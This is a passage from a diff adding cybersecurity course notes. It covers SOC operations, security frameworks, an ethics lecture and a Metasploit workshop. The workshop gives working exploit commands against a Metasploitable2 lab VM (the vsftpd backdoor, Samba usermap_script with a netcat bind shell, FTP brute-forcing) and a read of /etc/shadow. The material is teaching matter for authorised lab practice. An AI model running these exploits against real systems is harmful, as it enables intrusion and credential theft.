+- DNS sinkholes
+- Sandboxing technologies
+- Honeypot triggers
+- Reports from users
+
+#### 5. Respond
+**Minimise harm when attack occurs**
+
+**Low Severity:**
+- Block bad IP addresses
+- Disconnect active sessions
+- Reset compromised accounts
+- Isolate infected endpoints
+- Add hashes to blacklists
+- Apply patches
+
+**High Severity:**
+- Activate CIRT (Cyber Incident Response team) process
+- Call authorities
+- Enlist computer forensics experts
+- Preserve evidence
+
+#### 6. Recover
+**Get back to business – minimise disruption**
+- Recover from backups
+- Re-image infected machines
+- Communicate to affected users
+- Notify authorities
+- Learn from the incident
+
+### Indicators of Compromise (IOCs)
+
+**Definition**: Rules indicating signs of malicious activity, often linked to specific malware.
+
+**Sources**: 
+- Downloaded from threat intelligence feeds
+- Created in-house responding to incidents
+- Used by threat hunters and automated IDS/IPS systems
+
+**Example IOCs:**
+- Staff sending thousands of SPAM
+- Unusual login at unusual hours
+- High CPU/Memory usage on server
+- Servers making unusual internet access
+- Windows registry changes
+- Known/suspected bad files on filesystem
+- PowerShell launched as child process from MS Office
+- Internal network scanning
+
+### MITRE ATT&CK Framework
+
+**Purpose**: Comprehensive matrix of adversary tactics and techniques based on real-world observations.
+
+**Example - Kerberoasting:**
+- **Technique**: Request service tickets and return crackable ticket hashes
+- **Mitigation**: Strong passwords (25+ characters), limit service account privileges, enable AES encryption
+- **Detection**: Audit Kerberos Service Ticket Operations, investigate irregular patterns
+
+### SIEM - Splunk
+
+**Description**: "Google for machine logs"
+
+**Capabilities:**
+- Indexes 400GB+ of logs per day (terabytes at large orgs)
+- Query across multiple data sources
+- Set up alerts and scripted responses
+
+**Data Sources:**
+- Firewall/IDS/IPS logs
+- Network traffic metadata
+- Email traffic metadata
+- Sysmon logs from endpoints
+- DHCP, DNS, Auth events
+
+---
+
+## Information Security Management Frameworks
+
+### Major Frameworks
+
+#### ISO/IEC 27001/27002
+**ISO/IEC 27001:**
+- Framework for organisational management
+- Can be formally certified against
+- Annex A contains 114 controls across 14 domains (no implementation details)
+
+**ISO/IEC 27002:**
+- Expands on 114 controls with detailed implementation guidelines
+- Not a management or certification standard
+- "Big shopping list" of best practice controls
+
+**Mandatory Components for ISO 27001 Certification:**
+1. Scope
+2. Policies & Objectives
+3. Risk Assessment Methodology
+4. Statement of Applicability
+5. Risk Treatment Plan
+6. Risk Assessment Report
+7. Roles & Responsibilities
+8. Inventory of Assets
+9. Acceptable Use of Assets
+10. Access Control Policy
+11. Operating Procedures
+12. Security System Engineering Principles
+13. Supplier Security Policy
+14. Incident Management Procedure
+15. Business Continuity
+16. Statutory, Regulatory, and Contractual Requirements
+
+#### NIST Cybersecurity Framework (CSF)
+- Best-practice controls across 6 functions and 22 specific categories
+- Current version: 2.0
+
+#### CIS Critical Security Controls
+- 20 best-practice controls
+- Developed by SANS institute in response to breaches
+
+#### ACSC (Australian Cyber Security Centre)
+- **Essential 8**: Mitigation strategies against incidents
+- **ISM**: Australian Government Information Security Manual
+
+#### Other Frameworks
+- **PCI-DSS**: Payment Card Industry Data Security Standard
+- **COBIT 5**: Control Objectives for Information and Related Technologies
+
+---
+
+## Key Exam Points Summary
+
+### Security Engineering
+- **Definition**: Building dependable systems facing malice, error, mischance
+- **10 Core Principles**: Simplicity, Usability, Least Privilege, Segregation of Duties, Defence in Depth, Zero Trust, Security by Default, Fail Securely, Avoid Obscurity, Risk-Informed
+- **Cost Principle**: Earlier fixes are exponentially cheaper
+
+### Risk Management
+- **Risk Formula**: Threat + Vulnerability = Risk
+- **Quantitative**: ALE = SLE × ARO
+- **Qualitative**: Impact × Likelihood matrix
+- **Treatment**: Accept, Transfer, Mitigate, Avoid
+- **Controls**: Administrative/Physical/Technical and Preventive/Detective/Corrective
+
+### Security Operations
+- **SOC Cycle**: Assess → Intelligence → Threat Hunting → Detect → Respond → Recover
+- **Key Metrics**: MTTD (Mean Time To Detect), MTTR (Mean Time To Respond)
+- **Tools**: SIEM (Splunk), IDS/IPS, IOCs, MITRE ATT&CK framework
+
+### Management Frameworks
+- **ISO 27001/27002**: International certification standard with 114 controls
+- **NIST CSF**: 6 functions, 22 categories framework
+- **CIS Controls**: 20 critical security controls
+- **ACSC Essential 8**: Australian government recommendations
+
+---
+
+# 0x0C Introduction to Metasploit and Ethics
+
+## Table of Contents
+1. [Workshop 0x0C: Introduction to Metasploit](#metasploit-workshop)
+2. [Ethics in Cybersecurity](#ethics-in-cybersecurity)
+
+---
+
+## Workshop 0x0C: Introduction to Metasploit
+
+### Overview and Objectives
+- **Metasploit Framework**: Popular penetration testing tool
+- **Characteristics**: Flexible, modular, and expandable
+- **Components**: Rich set of modules and plugins
+- **Target Practice**: Metasploitable2 (vulnerable test system)
+
+### Metasploitable2 Setup
+
+#### Download and VM Creation
+1. **Download Source**: 
+   - Official docs: https://docs.rapid7.com/metasploit/metasploitable-2/
+   - Direct download: https://sourceforge.net/projects/metasploitable/
+
+2. **VirtualBox Setup**:
+   - Create new VM: Name → Type: Linux → Version: Oracle Linux
+   - Use default hardware settings
+   - **Important**: Select "use an existing virtual hard disk file"
+   - Browse and select the `.vmdk` file from extracted download
+   - **Network Settings**: 
+     - Adapter 1: Bridged (preferred)
+     - Adapter 2: Host-only adapter
+
+3. **Default Credentials**:
+   - Username: `msfadmin`
+   - Password: `msfadmin`
+
+4. **Get IP Address**: Run `ifconfig` to note machine's IP
+
+### Metasploit Framework Setup
+
+#### Installation and Updates
+```bash
+# Update system and install Metasploit
+sudo apt update
+sudo apt install metasploit-framework
+```
+
+#### First-Time Setup
+```bash
+# Initialize and start PostgreSQL database
+sudo msfdb init
+sudo msfdb start
+
+# Start Metasploit console
+msfconsole
+```
+
+#### Workspace Management
+```bash
+# Create new workspace
+msf > workspace -a workshop0x0C
+
+# List workspaces
+msf > workspace
+
+# Get help
+msf > help
+```
+
+### Scanning and Reconnaissance
+
+#### Database Commands
+```bash
+# Scan target with nmap integration
+msf > db_nmap -sS 172.16.104.131
+
+# Display discovered hosts
+msf > hosts
+
+# List discovered services
+msf > services
+
+# Filter services by port
+msf > services -p 80
+```
+
+#### Advanced Scanning
+```bash
+# Service version detection with XML output
+msf > nmap -sV 172.16.104.131 -oX 131.xml
+
+# Import XML results
+msf > db_import 131.xml
+
+# Filter services by host
+msf > services -s 172.16.104.131
+```
+
+### Exploitation Examples
+
+#### 1. VSFTPD 2.3.4 Backdoor Exploit
+
+**Vulnerability Research**:
+- Check Exploit DB: https://www.exploit-db.com/
+- Search for "vsftpd 2.3.4"
+- Confirmed malicious backdoor in download archive
+
+**Exploitation Steps**:
+```bash
+# Search for relevant exploits
+msf > search vsftpd
+
+# Load the exploit module
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+
+# Get module information
+msf exploit(unix/ftp/vsftpd_234_backdoor) > show info
+
+# Set target
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.0.0.107
+
+# Execute exploit
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+```
+
+**Backdoor Mechanism**:
+- Trigger: Smiley face `:)` in username field
+- Code: `sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")`
+- Opens backdoor on port 6200
+- Provides root shell access
+
+**Post-Exploitation**:
+```bash
+# Test root access
+cat /etc/shadow
+```
+
+#### 2. Samba Usermap Script Vulnerability
+
+**Target**: SMB service on port 139
+**Vulnerability**: Username map script command injection
+
+**Exploitation Steps**:
+```bash
+# Load SMB exploit
+msf > use exploit/multi/samba/usermap_script
+
+# Set payload
+msf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/bind_netcat
+
+# Show and configure options
+msf exploit(multi/samba/usermap_script) > show options
+msf exploit(multi/samba/usermap_script) > set RHOSTS 10.0.0.107
+msf exploit(multi/samba/usermap_script) > set RPORT 139
+msf exploit(multi/samba/usermap_script) > set LPORT 44444
+
+# Execute exploit
+msf exploit(multi/samba/usermap_script) > exploit
+```
+
+#### 3. ProFTPD Brute Force Attack
+
+**Scenario**: ProFTPD 1.3.1 on port 2121 (no known vulnerabilities)
+**Approach**: Credential brute-forcing
+
+**Setup**:
+```bash
+# Search for FTP login module
+msf > search ftp_login
+
+# Load brute force module
+msf > use auxiliary/scanner/ftp/ftp_login
+
+# Configure attack
+msf auxiliary(scanner/ftp/ftp_login) > set RHOSTS 10.0.0.107
+msf auxiliary(scanner/ftp/ftp_login) > set RPORT 2121
+msf auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+msf auxiliary(scanner/ftp/ftp_login) > set USER_AS_PASS yes
+msf auxiliary(scanner/ftp/ftp_login) > set BRUTEFORCE_SPEED 1
+
+# Launch attack
+msf auxiliary(scanner/ftp/ftp_login) > exploit
+```
+
+### Module Development
+
+#### Understanding Modules
+- **Location**: `/usr/share/metasploit-framework/modules/`
+- **Language**: Ruby
+- **Structure**: Object-oriented with inheritance
+
+#### Example Module Analysis
+**SMB Usermap Script Module** (`/usr/share/metasploit-framework/modules/exploits/multi/samba/usermap_script.rb`):
+- Inherits from `Msf::Exploit::Remote`
+- Rank: Excellent
+- Includes SMB client functionality
+- Exploits command execution in username mapping
+
+### GUI Interface: Armitage
+
+#### Installation and Launch
+```bash
+# Install Armitage
+sudo apt install armitage
+
+# Launch from Applications menu
+```
+
+**Features**:
+- Graphical interface for Metasploit
+- Visual host mapping
+- Point-and-click exploitation
+- Automated attack chains
+
+---
+
+## Ethics in Cybersecurity
+
+### Fundamental Concepts
+
+#### Definition of Ethics
+> "Ethics are a system of principles and rules concerning moral obligations and regard for the rights of others"
+
+#### Key Components
+- **Moral obligations**
+- **Rights of others**
+- **Systematic approach**
+- **Principled decision-making**
+
+### Ethical Behavior Framework
+
+#### Classification Matrix
+**Dimensions**:
+- **Harm Awareness**: Unaware ↔ Aware
+- **Application Level**: Personal/Ad Hoc ↔ Systematic
+
+**Behavior Types**:
+1. **Rationalisation/Indifference** (Unaware, Personal)
+2. **Dismissive** (Aware, Personal)  
+3. **Mechanical** (Unaware, Systematic)
+4. **Ethical Behaviour** (Aware, Systematic)
+
+### Three Major Ethical Schools
+
+#### 1. Consequentialism
+- **Focus**: Outcomes and consequences
+- **Goal**: Maximize good/minimize harm
+- **Challenges**:
+  - Subjective definition of "good"
+  - Individual vs. collective benefit conflicts
+  - Not all values are comparable or exchangeable
+
+#### 2. Duty-Focused (Deontological)
+- **Focus**: Adherence to rules and duties
+- **Principle**: Some actions are inherently right/wrong
+- **Application**: Universal principles regardless of outcomes
+
+#### 3. Virtue-Focused
+- **Focus**: Character and moral virtues
+- **Emphasis**: What kind of person should I be?
+- **Application**: Cultivating virtues like honesty, courage, justice
+
+### Critical Ethical Questions in Cybersecurity
+
+#### Question Framework: "Where is the harm?"
+
+**Examples for Analysis**:
+
+1. **System Exploration**
+   - "Where is the harm in exploring a system you discovered open?"
+   - **Considerations**: 
+     - Unintentional knowledge disclosure
+     - Creating attack vectors for others
+     - Modeling malicious behavior
+
+2. **IoT Device Activation**
+   - "Where is the harm in activating all network connectivity of household devices?"
+   - **Considerations**:
+     - Privacy invasion
+     - Security vulnerabilities
+     - Consent and ownership
+
+3. **Data Monetization**
+   - "Where is the harm in using enrollment data to sell advertising?"
+   - **Considerations**:
+     - Consent and transparency
+     - Data ownership rights
+     - Secondary use implications
+
+4. **Digital Piracy**
+   - "Where is the harm in copying music without paying?"
+   - **Considerations**:
+     - Artist compensation
+     - Industry sustainability
+     - Intellectual property rights
+
+### Reflection Framework
+
+#### The Golden Rule Test
+**Key Question**: "Is this principle one that you would like applied to you?"
+
+**Application Process**:
+1. Identify the underlying principle
+2. Consider role reversal
+3. Evaluate personal comfort with universal application
+4. Assess fairness and reciprocity
+
+### Professional Ethics Context
+
+#### Current Industry Focus
+- **Legal Compliance**: Avoiding legislation violations
+- **Financial Protection**: Preventing substantial fines
+- **Reputation Management**: Protecting brand value
+- **Risk Mitigation**: Proactive ethical frameworks
+
+#### GDPR as Ethics in Law
+- **Principle**: Data protection and privacy rights
+- **Enforcement**: Significant financial penalties
+- **Global Impact**: Worldwide compliance requirements
+- **Precedent**: Ethics codified into enforceable law
+
+### Complex Ethical Scenarios
+
+#### The Trolley Problem in Cybersecurity
+**Core Issue**: "Human life is not fungible"
+- **Application**: Autonomous system decisions
+- **Challenge**: Quantifying incomparable values
+- **Relevance**: AI decision-making in security contexts
+
+#### Information Gathering Ethics
+**When asking questions, expect three types of responses**:
+1. **Perception of truth** - What they believe is accurate
+2. **What they think you want to hear** - Socially desirable responses
+3. **Lies** - Deliberate deception
+
+### Practical Application
+
+#### Decision-Making Process
+1. **Identify stakeholders** and their interests
+2. **Analyze potential consequences** across different timeframes
+3. **Consider duty-based obligations** and universal principles
+4. **Evaluate character implications** - virtue development
+5. **Apply reflection test** - reciprocity and fairness
+6. **Document reasoning** for accountability
+
+#### Common Cybersecurity Ethical Dilemmas
+- **White Hat vs. Gray Hat** activities
+- **Disclosure timelines** for vulnerabilities
+- **Penetration testing boundaries**
+- **Data collection and retention**
+- **Automated defense responses**
+- **International law variations**
+
+### Key Takeaways
+
+#### Ethics Requires Exploration
+- **Complexity**: If resolution is simple, it's not truly an ethical dilemma
+- **Multiple perspectives**: Different frameworks yield different answers
+- **Context dependency**: Situational factors matter significantly
+
+#### Everything is Affected
+- **Behavior patterns**
+- **Stakeholder expectations** 
+- **Public perception**
+- **Outcome recognition and accountability**
+
+#### Professional Responsibility
+- **Continuous education** on ethical frameworks
+- **Proactive consideration** of ethical implications
+- **Collaborative discussion** with peers and mentors
+- **Documentation** of ethical decision-making processes
+
+---
+
+## Key Terms Glossary
+
+**Metasploit Framework**: Comprehensive penetration testing platform with modular exploit capabilities
+
+**Metasploitable2**: Intentionally vulnerable Linux system for security testing practice
+
+**Workspace**: Organizational unit in Metasploit for project separation and result management
+
+**Payload**: Code executed on target system after successful exploitation
+
+**Auxiliary Modules**: Non-exploit tools for reconnaissance, scanning, and brute-forcing
+
+**Ethics**: System of moral principles governing behavior and decision-making
+
+**Consequentialism**: Ethical framework judging actions by their outcomes
+
+**Deontological Ethics**: Duty-based ethical framework focusing on inherent right/wrong
+
+**Virtue Ethics**: Character-based ethical framework emphasizing moral development
+
+**GDPR**: General Data Protection Regulation - EU privacy law with global implications
+
+---
+
 ## 🔧 COMMAND REFERENCE SECTIONS
 
 ### Nmap Scanning Commands
